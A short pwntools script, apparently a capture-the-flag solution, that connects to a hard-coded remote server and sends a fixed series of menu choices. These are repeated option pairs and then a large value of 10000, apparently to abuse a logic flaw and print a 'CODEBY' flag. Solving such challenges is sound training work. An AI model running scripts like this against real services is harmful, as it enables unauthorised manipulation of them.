# resolved
# coding=utf-8
from pwn import *

host = "62.173.140.174"
port = 17300
r = remote(host, port)
a = True

while a:
    answer = r.recv().decode('utf-8')

    if 'CODEBY' in answer:
        print(answer.split()[0])
        a = False
    if 'Enter your choice (1-4):' in answer:
        r.sendline(b'1')
    if 'Enter your choice (1-5):' in answer:
        for i in range(10):
            r.sendline(b'3')
            r.sendline(b'1')
        r.sendline(b'3')
        r.sendline(b'10000')
        r.sendline(b'4')



